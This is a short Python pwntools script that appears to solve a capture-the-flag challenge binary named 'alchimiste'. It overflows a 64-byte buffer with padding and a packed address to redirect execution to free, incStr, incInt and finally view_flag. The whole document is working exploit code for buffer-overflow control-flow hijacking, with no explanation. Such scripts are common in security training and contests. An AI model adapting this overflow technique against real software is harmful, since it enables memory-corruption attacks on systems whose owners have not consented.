from pwn import *

elf = ELF('./alchimiste')

p = process(elf.path)

def call_func(addr):
    p.recvuntil(b">>> ")
    p.sendline(b"3\n")
    p.recvuntil(b"[Vous] :")
    payload = b"A"*64
    payload += p64(addr)
    p.sendline(payload)
    p.recvuntil(b">>> ")
    p.sendline(b"2\n")



p.recvuntil(b">>> ")
p.sendline(b"1\n")

p.recvuntil(b">>> ")
p.sendline(b"2\n")


pause()
call_func(elf.plt.free)
for i in range(0, 20):
    call_func(elf.sym.incStr)
    call_func(elf.sym.incInt)
pause()
p.interactive()
call_func(elf.sym.view_flag)



p.interactive()
